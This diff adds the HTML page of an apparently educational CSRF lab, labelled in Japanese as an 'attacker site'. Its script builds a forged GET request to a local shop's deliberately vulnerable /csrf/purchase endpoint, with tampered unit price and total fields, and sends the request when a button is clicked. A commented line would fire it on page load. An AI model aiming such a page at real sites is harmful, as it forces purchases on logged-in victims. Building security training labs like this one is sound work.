@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Attacker Site (CSRF Demo)</title>
+    <style>
+      body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; margin: 24px; line-height: 1.5; }
+      code { background: #f2f2f2; padding: 1px 4px; border-radius: 4px; }
+      .card { border: 1px solid #ddd; border-radius: 8px; padding: 12px; margin-bottom: 12px; }
+      button { padding: 8px 12px; }
+      input { width: 100%; padding: 8px; margin: 6px 0 10px; }
+      .muted { color: #666; }
+    </style>
+  </head>
+  <body>
+    <h1>Attacker Site（CSRF体験）</h1>
+    <div class="card">
+      <p class="muted">
+        これは学習用の「攻撃者サイト」です。Shopにログインした状態でこのページを開くと、CSRFで購入が実行されます。
+      </p>
+      <p class="muted">
+        ターゲット: <code id="targetBase"></code>
+      </p>
+
+      <label>product_id</label>
+      <input id="productId" value="1" />
+
+      <label>quantity</label>
+      <input id="quantity" value="1" />
+
+      <label>unit_price_yen（改ざん例）</label>
+      <input id="unitPrice" value="1" />
+
+      <label>total_yen（改ざん例・任意で上書き）</label>
+      <input id="total" value="" placeholder="空なら自動計算" />
+
+      <label>note</label>
+      <input id="note" value="CSRF_purchase" />
+
+      <button id="attackBtn" type="button">CSRFを実行（GET）</button>
+      <div class="muted">
+        注: 学習の再現性のため、Shop側に <code>/csrf/purchase</code>（GET購入）を用意しています。
+      </div>
+    </div>
+
+    <script>
+      // server.js が注入する
+      const TARGET_BASE = window.__TARGET_BASE__ || "http://localhost:4000";
+      document.getElementById("targetBase").textContent = TARGET_BASE;
+
+      function buildUrl() {
+        const product_id = document.getElementById("productId").value;
+        const quantity = document.getElementById("quantity").value;
+        const unit_price_yen = document.getElementById("unitPrice").value;
+        const total_input = document.getElementById("total").value;
+        const note = document.getElementById("note").value;
+
+        const q = parseInt(quantity, 10);
+        const n = Number.isFinite(q) && q > 0 ? q : 1;
+        const u = Number(unit_price_yen);
+        const auto = Number.isFinite(u) ? u * n : n;
+        const total_yen = total_input === "" ? auto : total_input;
+
+        const url = new URL("/csrf/purchase", TARGET_BASE);
+        url.searchParams.set("product_id", product_id);
+        url.searchParams.set("quantity", quantity);
+        url.searchParams.set("unit_price_yen", unit_price_yen);
+        url.searchParams.set("total_yen", total_yen);
+        url.searchParams.set("note", note);
+        return url.toString();
+      }
+
+      document.getElementById("attackBtn").addEventListener("click", () => {
+        location.href = buildUrl();
+      });
+
+      // 自動実行（ページを開いた瞬間にCSRFを走らせたい場合）
+      // location.href = buildUrl();
+    </script>
+  </body>
+</html>
